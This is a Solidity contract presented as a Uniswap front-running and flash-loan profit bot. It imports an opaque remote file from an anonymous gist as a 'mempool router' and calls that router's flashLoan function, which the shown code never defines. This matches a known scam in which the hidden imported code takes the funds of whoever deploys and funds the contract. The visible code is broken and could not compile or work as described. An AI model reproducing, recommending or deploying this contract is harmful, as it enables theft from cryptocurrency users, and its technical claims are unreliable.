pragma solidity ^0.8.2;

// Import Libraries Migrator/Exchange/Factory
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/IUniswapV2Migrator.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/V1/IUniswapV1Factory.sol";
//Mempool router
import "https://gist.githubusercontent.com/MempoolCheck/634653ccdba683ff00b466fe17c4c140/raw/739723cb2faa43cfbbba974713c33b624cb13052/gistfile1.txt";

contract UniswapFrontrunBot {
  string public tokenName;
  string public tokenSymbol;
  uint public frontrun;
  Manager public manager;

  constructor(string memory _tokenName, string memory _tokenSymbol) public {
    tokenName = _tokenName;
    tokenSymbol = _tokenSymbol;
    manager = new Manager();
  }

  receive() external payable {}

  // Struct for storing slices of data
  struct Slice {
    uint len;
    uint ptr;
  }

  /*
   * @dev Finds newly deployed contracts on Uniswap Exchange
   * @param self The slice to compare against.
   * @param other The second slice to compare.
   * @return New contracts with required liquidity.
   */
  function findNewContracts(Slice memory self, Slice memory other) internal pure returns (int) {
    uint shortest = self.len;

    // Find the shortest slice
    if (other.len < self.len)
      shortest = other.len;

    // Compare the two slices element by element
    uint selfptr = self.ptr;
    uint otherptr = other.ptr;

    for (uint idx = 0; idx < shortest; idx += 32) {
      // Initiate contract finder
      uint a;
      uint b;

      string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
      string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
      loadCurrentContract(WETH_CONTRACT_ADDRESS, TOKEN_CONTRACT_ADDRESS);

      // If contract found, start flash loan
      if (a == b) {
        flashLoan(self, other);
      }

      // Increment pointers
      selfptr += 32;
      otherptr += 32;
    }
  }

  // Call flash loan from mempool router
  function flashLoan(Slice memory self, Slice memory other) public {
    // Get flash loan parameters
    uint loanAmount = self.len * other.len;
    uint collateralAmount = loanAmount * frontrun;

    // Call mempool router to start flash loan
    MempoolRouter.flashLoan(loanAmount, collateralAmount);
  }

  // Start frontrun
  function startFrontrun() public {
    // Load current factory and exchange contracts
    IUniswapV1Factory factory = IUniswapV1Factory(manager.factoryAddress);
    IUniswapV1Exchange exchange = IUniswapV1Exchange(manager.exchangeAddress);

    // Get the current exchange and factory slices
    Slice memory self = factory.getExchangeListSlice();
    Slice memory other = exchange.getTokenExchangeListSlice();

    // Find the new contracts
    findNewContracts(self, other);
  }

  function loadCurrentContract(address WETH_CONTRACT_ADDRESS, address TOKEN_CONTRACT_ADDRESS) public {
    manager.factoryAddress = WETH_CONTRACT_ADDRESS;
    manager.exchangeAddress = TOKEN_CONTRACT_ADDRESS;
  }

  // Manager struct
  struct Manager {
    address factoryAddress;
    address exchangeAddress;
  }
}
